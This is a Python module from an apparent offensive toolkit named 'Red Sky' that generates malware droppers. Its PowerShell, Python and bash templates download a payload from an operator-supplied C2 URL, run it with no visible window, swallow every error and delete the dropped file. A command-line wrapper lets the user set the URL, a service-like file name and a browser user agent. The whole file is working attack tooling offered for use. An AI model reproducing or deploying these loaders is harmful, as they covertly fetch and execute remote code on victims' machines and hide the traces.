# language: Python, file: Program/payload/dropper.py, target: Red Sky payload — dropper
# Build staged loaders. A tiny first-stage that pulls the real payload from
# your C2, runs it, and cleans up.

import sys
from pathlib import Path
from typing import List

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import load_config, print_ok, print_err, print_info, print_warn, print_kv, print_bullet
from Program.utils.paths import OUTPUT_DIR


PS_DROPPER = r'''$ErrorActionPreference = "SilentlyContinue"
$url = "{url}"
$tmp = "$env:TEMP\{fname}"
try {{
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "{ua}")
    $wc.DownloadFile($url, $tmp)
    Start-Process $tmp -WindowStyle Hidden
    Start-Sleep -Seconds 2
    Remove-Item $tmp -Force
}} catch {{ }}
'''


PY_DROPPER = r'''# language: Python, file: dropper.py, target: minimal staged loader
import os, sys, tempfile, subprocess, urllib.request

URL = "{url}"
UA = "{ua}"
TMP = os.path.join(tempfile.gettempdir(), "{fname}")

try:
    req = urllib.request.Request(URL, headers={{"User-Agent": UA}})
    with urllib.request.urlopen(req, timeout=15) as r, open(TMP, "wb") as f:
        f.write(r.read())
    flags = 0x08000000  # CREATE_NO_WINDOW
    subprocess.Popen([TMP], creationflags=flags)
except Exception:
    pass
finally:
    try:
        os.remove(TMP)
    except OSError:
        pass
'''


BASH_DROPPER = r'''#!/bin/bash
# language: bash, file: dropper.sh, target: minimal staged loader
URL="{url}"
UA="{ua}"
TMP="/tmp/{fname}"
curl -sL -A "$UA" -o "$TMP" "$URL" 2>/dev/null
chmod +x "$TMP"
"$TMP" &
sleep 2
rm -f "$TMP"
'''


def cmd_gen(lang: str, url: str, fname: str = "svc.exe", ua: str = "Mozilla/5.0") -> int:
    lang = lang.lower()

    if lang == "ps" or lang == "powershell":
        result = PS_DROPPER.format(url=url, fname=fname, ua=ua)
        ext = ".ps1"
    elif lang == "py" or lang == "python":
        result = PY_DROPPER.format(url=url, fname=fname, ua=ua)
        ext = ".py"
    elif lang == "sh" or lang == "bash":
        result = BASH_DROPPER.format(url=url, fname=fname, ua=ua)
        ext = ".sh"
    else:
        print_err(f"unknown language: {lang}")
        print_info("available: ps | py | sh")
        return 2

    print_info(f"generated {lang} dropper")
    print()
    print(result)

    out = OUTPUT_DIR / "payload" / f"dropper{ext}"
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(result)
    if ext == ".sh":
        out.chmod(0o755)
    print()
    print_kv("saved", out)
    return 0


def run_cli(args: List[str]) -> int:
    if len(args) < 2:
        print_err("usage: redsky payload dropper <ps|py|sh> <payload_url> [fname] [ua]")
        return 2
    return cmd_gen(args[0], args[1],
                   args[2] if len(args) > 2 else "svc.exe",
                   args[3] if len(args) > 3 else "Mozilla/5.0")


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
